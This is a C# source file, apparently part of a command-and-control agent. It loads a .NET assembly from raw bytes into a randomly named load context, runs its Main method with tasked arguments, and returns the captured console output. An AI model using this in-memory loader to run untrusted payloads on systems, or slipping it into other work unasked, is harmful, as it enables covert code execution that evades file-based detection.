using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.Loader;
using Agent.Utilities;
public class ConsoleOutputRedirector : IDisposable
{
    private readonly StringWriter stringWriter;
    private readonly TextWriter originalOutput;

    public ConsoleOutputRedirector()
    {
        stringWriter = new StringWriter();
        originalOutput = Console.Out;
        Console.SetOut(stringWriter);
    }

    public string GetOutput()
    {
        return stringWriter.ToString();
    }

    public void Dispose()
    {
        Console.SetOut(originalOutput);
        stringWriter.Dispose();
    }
}

public class ConsoleApplicationExecutor
{
    private AssemblyLoadContext alc = new AssemblyLoadContext(Misc.RandomString(10));
    private byte[] asmBytes;
    private string[] args;
    private string task_id;
    public ConsoleApplicationExecutor(byte[] asmBytes, string[] args, string task_id)
    {
        this.asmBytes = asmBytes;
        this.args = args;
        this.task_id = task_id;
    }
    public ConsoleApplicationExecutor()
    {

    }
    public string ExecuteConsoleApplication()
    {
        using (var redirector = new ConsoleOutputRedirector())
        {
            // Load the assembly
            Assembly assembly = alc.LoadFromStream(new MemoryStream(this.asmBytes));

            // Find the entry point (Main method)
            MethodInfo entryPoint = assembly.EntryPoint;

            // Create an instance of the class containing the Main method
            object instance = assembly.CreateInstance(entryPoint.DeclaringType.FullName);

            // Invoke the Main method
            entryPoint.Invoke(instance, new object[] { this.args });

            // Return the captured output
            return redirector.GetOutput();
        }
    }
}